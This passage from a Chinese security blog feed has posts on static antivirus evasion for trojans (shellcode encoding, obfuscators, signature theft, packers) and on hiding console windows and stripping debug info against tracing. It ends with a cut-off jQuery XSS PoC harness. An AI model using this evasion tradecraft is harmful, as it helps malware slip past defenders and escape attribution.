src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751894572265-1aaca92b-1609-4627-9f09-d42fb5251a75.png" alt="img"></p><h1 id="五、现成字体"><a href="#五、现成字体" class="headerlink" title="五、现成字体"></a>五、现成字体</h1><p>通过网盘分享的文件：Burpsuite字体</p><p>链接: <a href="https://pan.baidu.com/s/1hlf7RH9bsOfvH8ZtJGLXig?pwd=ydfu">https://pan.baidu.com/s/1hlf7RH9bsOfvH8ZtJGLXig?pwd=ydfu</a> 提取码: ydfu</p>]]></content>
    
    
    <categories>
      
      <category>攻防渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具配置</tag>
      
      <tag>BurpSuite配置</tag>
      
      <tag>字体</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免入土（四）静态免杀</title>
    <link href="/2025/07/06/%E5%85%8D%E5%85%A5%E5%9C%9F%EF%BC%88%E5%9B%9B%EF%BC%89%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80/"/>
    <url>/2025/07/06/%E5%85%8D%E5%85%A5%E5%9C%9F%EF%BC%88%E5%9B%9B%EF%BC%89%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80/</url>
    
    <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>在免杀上也学习了一段时间，也是做出了几个不错的免杀马，是时候把静态免杀上的内容写一下了。</p><p>在静态免杀层面上，要做的工作就是尽可能使杀软不能够从字符串（shellcode和各种字符串）层面检测到，所以只要把字符串的工作做好，基本过静态就没什么问题；剩下的就是锦上添花，增加程序可信度和反调试、反沙箱的工作。</p><p>本文主要是给出学习过程中遇到的一些好用的工具，以及在静态免杀上所需要做的一些工作。</p><p>静态免杀在只要到位就行，不需要深究，因为无论你在静态免杀上做多大的功夫，遇上行为检测都是过不了的。</p><h1 id="二、静态免杀"><a href="#二、静态免杀" class="headerlink" title="二、静态免杀"></a>二、静态免杀</h1><h2 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h2><p>静态免杀（Static AV Evasion）是攻击者在构造恶意程序或 Payload 时，<strong>为了绕过杀毒软件、EDR、WAF、沙箱等防御系统的静态检测机制</strong>，所采取的一系列文件级、结构级、内容级和逻辑级的隐藏与伪装手段。</p><p>本质目标是：<strong>在不运行文件的前提下，让恶意载荷在磁盘上看起来像“正常程序”，以此骗过静态扫描引擎的查杀逻辑。</strong></p><p>以下是一些检测机制的一些检测点，我们主要就是要对这些检测点的静态特征进行编码、加密、删除或修改；</p><table><thead><tr><th><strong>检测机制</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>YARA规则匹配</td><td>静态签名规则，通过字节序列、字符串、正则、节偏移等匹配判断</td></tr><tr><td>PE结构分析</td><td>检查节数量、IAT异常、入口点特征、导入表错位、异常节大小</td></tr><tr><td>签名哈希识别</td><td>直接比对已知病毒样本的哈希、壳加密模板或通用工具特征</td></tr><tr><td>敏感字符串检测</td><td>检查是否包含关键函数、命令片段、URL、域名等（如 powershell、cmd.exe）</td></tr><tr><td>模型分类识别</td><td>基于训练模型判断结构是否异常、是否包含常见攻击组件</td></tr></tbody></table><p>主要思路就是对各种字符串进行编码加密、对资源图标和签名进行替换或添加、对敏感 api 进行手动编写以及对程序加壳，除此之外，可以还可以通过现成的工具添加垃圾代码扰乱静态分析，完成这些，在静态方面基本已经能够实现免杀。</p><ul><li>字符串：shellcode、变量名、key、api 函数名等等；</li><li>签名、资源块、程序图标：设置或者替换，使杀软无法通过这些进行识别；</li><li>敏感 Windows Api 函数：通过自实现 Windows Api 函数的查找和调用绕过（严格来说算动态，在动态里也会说）；</li><li>添加垃圾代码扰乱静态分析，降低熵值；</li></ul><h2 id="2-2-编码与加密"><a href="#2-2-编码与加密" class="headerlink" title="2.2 编码与加密"></a>2.2 编码与加密</h2><p>编码方式：Base64、UUID、ipv4、ipv6、mac、字节翻转等等</p><p>加密方法：xor、AES、RC4、SHA、RSA 等等</p><ul><li><strong>shellcode</strong></li></ul><p>对于 shellcode 的编码和加密，首先先推荐一个项目 sgn：<a href="https://github.com/EgeBalci/sgn">https://github.com/EgeBalci/sgn</a>，直到目前位置该项目所进行编码后的 shellcode 仍然是不可预测的，因此很好的避免了杀软对 shellcode 的检测；</p><p>因此，shellcode 的编码和加密采用<code>sgn + </code>的方式进行即可，无论加什么都能够达到一个非常好的效果！（即使<code>sgn + Null</code>也一样）</p><p>不需要花太多精力在编码和加密上，sgn 真的够用，结合一种加密或编码方式即可。<br>有那精力不如放在如何绕过杀软的行为检测上……</p><ul><li><strong>变量名和文件名</strong></li></ul><p>杀软对变量名的检测主要在于一个特别引人注目的变量名，如 shellcode、payload、LoadLibrary 等 api 函数等等；对于此类问题的防检测方法就是使用现成的或自己编写的混淆项目对我们编写好的代码进行混淆，这里也列举一些混淆的项目供大家参考：</p><ol><li><a href="https://github.com/obfuscator-llvm/obfuscator">https://github.com/obfuscator-llvm/obfuscator</a></li><li><a href="https://tigress.wtf/">https://tigress.wtf/</a></li><li><a href="https://gitcode.com/gh_mirrors/cp/cpp-obfuscator">https://gitcode.com/gh_mirrors/cp/cpp-obfuscator</a></li><li><a href="https://github.com/KomiMoe/Arkari">https://github.com/KomiMoe/Arkari</a></li></ol><h2 id="2-3-签名、图标-ico、资源节替换"><a href="#2-3-签名、图标-ico、资源节替换" class="headerlink" title="2.3 签名、图标 ico、资源节替换"></a>2.3 签名、图标 ico、资源节替换</h2><p>字面意思，很容易理解，网上也能搜索到一大堆文章；这里推荐几个工具和项目</p><ol><li><a href="https://github.com/langsasec/Sign-Sacker">https://github.com/langsasec/Sign-Sacker</a>（签名+ico 替换）</li><li><a href="https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/sigthief.py">https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/sigthief.py</a>（签名工具）</li><li><a href="https://github.com/TideSec/BypassAntiVirus/blob/master/tools/mimikatz/ResHacker.zip">https://github.com/TideSec/BypassAntiVirus/blob/master/tools/mimikatz/ResHacker.zip</a>（资源节替换）</li></ol><h2 id="2-4-软件加壳"><a href="#2-4-软件加壳" class="headerlink" title="2.4 软件加壳"></a>2.4 软件加壳</h2><p>软件加壳原本的目的使为了反调试和反逆向的，在免杀中软件加壳可以用来防止静态查杀以及沙箱；软件加壳同样会带来一些特征，容易被杀软识别。</p><p>因此，如果能够加一些比较好的商业壳，那对免杀肯定是大有益处的。如果没有商业壳，一些免费的软件壳也可以用来进行尝试，不保证有效果；</p><p>常见的软件壳：UPX、VMP、Themida (Oreans Technology)、Armadillo (Silicon Realms)、Enigma Protector、Obsidium、ASPack、Enigma Virtual Box</p><p>加壳工具：</p><ol><li><a href="https://down.52pojie.cn/Tools/Packers/">https://down.52pojie.cn/Tools/Packers/</a></li><li><a href="https://www.52pojie.cn/thread-2026356-1-1.html">https://www.52pojie.cn/thread-2026356-1-1.html</a></li><li><a href="https://www.vmprotect.com.cn/download/">https://www.vmprotect.com.cn/download/</a></li></ol><h1 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h1><ol><li><a href="https://blog.csdn.net/syg6921008/article/details/146990142">https://blog.csdn.net/syg6921008/article/details/146990142</a></li><li><a href="https://github.com/EgeBalci/sgn">https://github.com/EgeBalci/sgn</a></li><li><a href="https://github.com/obfuscator-llvm/obfuscator">https://github.com/obfuscator-llvm/obfuscator</a></li><li><a href="https://tigress.wtf/">https://tigress.wtf/</a></li><li><a href="https://gitcode.com/gh_mirrors/cp/cpp-obfuscator">https://gitcode.com/gh_mirrors/cp/cpp-obfuscator</a></li><li><a href="https://github.com/langsasec/Sign-Sacker">https://github.com/langsasec/Sign-Sacker</a></li><li><a href="https://github.com/KomiMoe/Arkari">https://github.com/KomiMoe/Arkari</a></li><li><a href="https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/sigthief.py">https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/sigthief.py</a></li><li><a href="https://github.com/TideSec/BypassAntiVirus/blob/master/tools/mimikatz/ResHacker.zip">https://github.com/TideSec/BypassAntiVirus/blob/master/tools/mimikatz/ResHacker.zip</a></li><li><a href="https://down.52pojie.cn/Tools/Packers/">https://down.52pojie.cn/Tools/Packers/</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>免杀对抗</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀对抗</tag>
      
      <tag>静态免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免入土（三）编译工具配置</title>
    <link href="/2025/06/12/%E5%85%8D%E5%85%A5%E5%9C%9F%EF%BC%88%E4%B8%89%EF%BC%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE/"/>
    <url>/2025/06/12/%E5%85%8D%E5%85%A5%E5%9C%9F%EF%BC%88%E4%B8%89%EF%BC%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>本文主要介绍的内容是关于 Visual Studio 配置和对程序的一些处理，主要是为了防止生成的免杀木马容易被溯源或者被查杀软件查杀。</p><h1 id="二、Visual-Studio-配置"><a href="#二、Visual-Studio-配置" class="headerlink" title="二、Visual Studio 配置"></a>二、Visual Studio 配置</h1><ol><li>生成 release 的时候使用 MT，不要使用多线程 DLL(&#x2F;MD)</li></ol><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1747123439513-5a19cd48-ffcb-4ae2-9703-f9a481ee5082.png" alt="img"></p><ol><li>关闭生成编译信息（防止溯源定位）</li></ol><p>如果不关闭该选项的话可能会导致生成的 exe 文件中包含编译路径和相关计算机的用户名</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1747123003278-38034a1c-d1a2-47d6-8326-a3edfbd0915e.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1749696717769-d782ffc1-d3de-4071-bba0-d490a1046cd4.png" alt="img"></p><p>若未关闭上述设置则会出现如上图的调试信息，可定位编译生成的<code>.pdb</code>文件的位置，泄露物理路径。</p><h1 id="三、程序黑框处理"><a href="#三、程序黑框处理" class="headerlink" title="三、程序黑框处理"></a>三、程序黑框处理</h1><h2 id="3-1-pragma-预处理指令"><a href="#3-1-pragma-预处理指令" class="headerlink" title="3.1 pragma 预处理指令"></a>3.1 pragma 预处理指令</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span><br></code></pre></td></tr></table></figure><h2 id="3-2-API-隐藏窗口"><a href="#3-2-API-隐藏窗口" class="headerlink" title="3.2 API 隐藏窗口"></a>3.2 API 隐藏窗口</h2><ol><li><strong>FreeConsole 函数</strong></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">FreeConsole</span>();<br></code></pre></td></tr></table></figure><ol><li><strong>GetForegroundWindow + ShowWindow 函数</strong></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HWND hwnd = <span class="hljs-built_in">GetForegroundWindow</span>();<br><span class="hljs-built_in">ShowWindow</span>(hwnd, SW_HIDE);<br></code></pre></td></tr></table></figure><ol><li><strong>创建子进程</strong></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 判断启动参数是否为 go，如果是则表明这是子进程，窗口已隐藏</span><br>    <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">2</span> &amp;&amp; <span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;go&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;隐藏窗口&quot;</span>, <span class="hljs-string">&quot;隐藏窗口&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 获取当前程序完整路径</span><br>    <span class="hljs-type">char</span> path[MAX_PATH * <span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">GetModuleFileNameA</span>(<span class="hljs-literal">NULL</span>, path, MAX_PATH * <span class="hljs-number">4</span>);<br>    <span class="hljs-comment">// 路径加上参数 go</span><br>    <span class="hljs-built_in">strcat_s</span>(path, <span class="hljs-string">&quot; go&quot;</span>);<br><br>    STARTUPINFOA StartInfo;<br>    PROCESS_INFORMATION pinfo;<br>    <span class="hljs-built_in">memset</span>(&amp;StartInfo, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(STARTUPINFO));<br>    StartInfo.cb = <span class="hljs-built_in">sizeof</span>(STARTUPINFO);<br>    <span class="hljs-comment">//StartInfo.dwFlags = STARTF_USESHOWWINDOW;</span><br>    <span class="hljs-comment">//StartInfo.wShowWindow = SW_HIDE;</span><br>    BOOL result = <span class="hljs-built_in">CreateProcessA</span>(<span class="hljs-literal">NULL</span>, path, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, CREATE_NO_WINDOW, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;StartInfo, &amp;pinfo);<br>    <br>    <span class="hljs-keyword">if</span> (!result) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;创建子进程失败：%d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">10000</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用该方式隐藏窗口效果等同于 FreeConsole 函数，启动窗口一闪而过，但是隐蔽方式比 FreeConsole 函数要好，但是在某些杀软的复杂环境下可能会阻止进程创建子进程从而导致程序执行失败。</p><h2 id="3-3-WinMain"><a href="#3-3-WinMain" class="headerlink" title="3.3 WinMain()"></a>3.3 WinMain()</h2><ul><li>hInstance：当前实例的句柄。</li><li>hPrevInstance：先前实例的句柄，在现代的Windows系统中这个参数总是NULL。</li><li>lpCmdLine：命令行参数，是一个指向以空字符结尾的字符串的指针。</li><li>nCmdShow：指定窗口应该以何种形式显示。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="hljs-type">int</span> nCmdShow)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// ... 其他初始化工作 ...</span><br><br>  <span class="hljs-comment">// 创建窗口并显示</span><br>  HWND hWnd = <span class="hljs-built_in">CreateWindow</span>(<span class="hljs-comment">/* 创建窗口的参数 */</span>);<br>  <span class="hljs-built_in">ShowWindow</span>(hWnd, SW_HIDE);  <span class="hljs-comment">// 将窗口隐藏起来</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><ol><li>对于 visual studio 生成的程序处理，不要保存调试信息，以防反编译溯源本人。</li><li>对于免杀马执行产生黑框的情况，可以采取 3 种方式进行解决，分别为 Pragma 启动 windows 子系统解决、FreeConsole()函数或GetForegroundWindow 函数解决黑框、通过 WinMain()将黑框隐藏。</li></ol>]]></content>
    
    
    <categories>
      
      <category>免杀对抗</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具配置</tag>
      
      <tag>免杀对抗</tag>
      
      <tag>Visual Studio</tag>
      
      <tag>防溯源</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免入土（二）windows编程基础</title>
    <link href="/2025/06/12/%E5%85%8D%E5%85%A5%E5%9C%9F%EF%BC%88%E4%BA%8C%EF%BC%89windows%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/06/12/%E5%85%8D%E5%85%A5%E5%9C%9F%EF%BC%88%E4%BA%8C%EF%BC%89windows%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>免杀从入门到入土（二）windows 基础编程</p><p>主要聚焦于对 PE 文件结构的学习、Windows 的基础编程方式以及如何修改 PE 文件的执行流程；</p><p>（对于一些文件结构的解析呢，这里不会写太多的内容，都是一些死东西，也有很多师傅做过非常细致的研究，文章中会摆一些我个人觉得写得比较好的一些师傅的链接，也是我学习的时候参考的链接）</p><p>为什么我不细致的写，主要也是因为我个人觉得自己可能学得不是那么到位，可能会误人子弟；</p><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>本人前期是学二进制方向的，所有具有一定的汇编和堆栈基础，不是什么非常高深的堆栈理解，比较浅显，但是一定要会一点，这很重要（包括但不限于函数调用的时候参数的压栈方式等等）；</p><p>本来免杀从入门到入土的第二篇是打算写工具生成的免杀码的，但是找来找去也没发现什么很新很新值得测试的工具，而且用工具生成的终究是用工具生成的，始终不是自己的。基于以上两个原因，我还是放弃了工具生成免杀码的方式，主要是局限性太大，没办法应对不同的情况；</p><p>因此，免杀从入门到入土（二）windows 基础编程，从免杀学习的角度来说，这是必不可少的基础；</p><h1 id="二、PE-文件结构解析"><a href="#二、PE-文件结构解析" class="headerlink" title="二、PE 文件结构解析"></a>二、PE 文件结构解析</h1><h2 id="2-1-PE-文件结构"><a href="#2-1-PE-文件结构" class="headerlink" title="2.1 PE 文件结构"></a>2.1 PE 文件结构</h2><p><a href="https://blog.csdn.net/freeking101/article/details/102752048">https://blog.csdn.net/freeking101/article/details/102752048</a></p><p>上述链接其实对 PE 文件结构做了非常细致的解析，但是这篇博客呢，又更像一本字典或者参考书，全部记下来，不太可能，但是先总体阅读学习一边总是有好处的；</p><p>再完成对 PE 文件结构的学习之后呢，仅接着要做的就是对一个 PE 文件进行加节 section；</p><h2 id="2-2-添加节-Section"><a href="#2-2-添加节-Section" class="headerlink" title="2.2 添加节 Section"></a>2.2 添加节 Section</h2><p><a href="https://blog.csdn.net/qq_21095573/article/details/107686357">https://blog.csdn.net/qq_21095573/article/details/107686357</a></p><p>添加节的这个操作在我看来其实并不复杂，主要的作用就是让我们进一步熟悉 windows 编程和 PE 文件头中的一些数据的含义以及它们之间的相互关系；</p><h2 id="2-3-导入表"><a href="#2-3-导入表" class="headerlink" title="2.3 导入表"></a>2.3 导入表</h2><p><a href="https://www.52pojie.cn/thread-1413220-1-1.html">https://www.52pojie.cn/thread-1413220-1-1.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1749706033969-9ce671c9-42c0-4b00-9915-fedc67cf2c58.png" alt="img"></p><h2 id="2-4-导出表"><a href="#2-4-导出表" class="headerlink" title="2.4 导出表"></a>2.4 导出表</h2><p><a href="https://www.52pojie.cn/thread-1412395-1-1.html">https://www.52pojie.cn/thread-1412395-1-1.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1749706332353-d3be82c8-14fb-42aa-b309-5c772192b366.png" alt="img"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://blog.csdn.net/freeking101/article/details/102752048">https://blog.csdn.net/freeking101/article/details/102752048</a></li><li><a href="https://blog.csdn.net/richard1230/article/details/82979057">https://blog.csdn.net/richard1230/article/details/82979057</a></li><li><a href="https://blog.csdn.net/houbincarson/article/details/135696212">https://blog.csdn.net/houbincarson/article/details/135696212</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>免杀对抗</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀对抗</tag>
      
      <tag>PE文件</tag>
      
      <tag>Windows编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>API接口测试之jQuery XSS测试HTMl模板</title>
    <link href="/2025/05/07/API%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E4%B9%8BjQuery-XSS%E6%B5%8B%E8%AF%95HTMl%E6%A8%A1%E6%9D%BF/"/>
    <url>/2025/05/07/API%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E4%B9%8BjQuery-XSS%E6%B5%8B%E8%AF%95HTMl%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<p>网上流传的对jQuery XSS测试的模板都是需要对源码的 src api 进行修改，对大量测试来说还是比较麻烦；</p><p>因此，这边直接加入了一个输入框进行输入相应的 api 接口，实现无需打开 html 源码修改，更加简便；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1746584153943-4c681159-e235-43b7-9154-f4c4a9fc9d4f.png" alt="img"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>jQuery XSS测试<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 通过用户输入控制jQuery地址 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;about:blank&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;jqScript&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-comment">&lt;!-- URL输入区域 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin: 10px;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;apiUrl&quot;</span> </span><br><span class="hljs-tag">           <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;输入jQuery API地址&quot;</span></span><br><span class="hljs-tag">           <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 400px; padding: 5px;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-comment">// 动态替换jQuery引用</span></span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;apiUrl&#x27;</span>).<span class="hljs-property">onchange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;jqScript&#x27;</span>).<span class="hljs-property">src</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>;</span><br><span class="language-javascript">&#125;;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 原始测试代码保持不变 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">n,jq</span>)&#123;</span><br><span class="language-javascript">    sanitizedHTML = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;poc&#x27;</span>+n).<span class="hljs-property">innerHTML</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">if</span>(jq)&#123;</span><br><span class="language-javascript">        $(<span class="hljs-string">&#x27;#div&#x27;</span>).<span class="hljs-title function_">html</span>(sanitizedHTML);</span><br><span class="language-javascript">    &#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-javascript">        div.<span class="hljs-property">innerHTML</span>=sanitizedHTML;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>jQuery XSS Examples (CVE-2020-11022/CVE-2020-11023)<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>PoCs of XSS bugs fixed in <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;//blog.jquery.com/2020/04/10/jquery-3-5-0-released/&quot;</span>&gt;</span>jQuery 3.5.0<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>. You can find the details in my blog post: <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;//mksben.l0.cm/2020/05/jquery3.5.0-xss.html&quot;</span>&gt;</span>English<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> / <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;//masatokinugawa.l0.cm/2020/05/jquery3.5.0-xss.html&quot;</span>&gt;</span>日本語<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br> <br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>PoC 1<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span 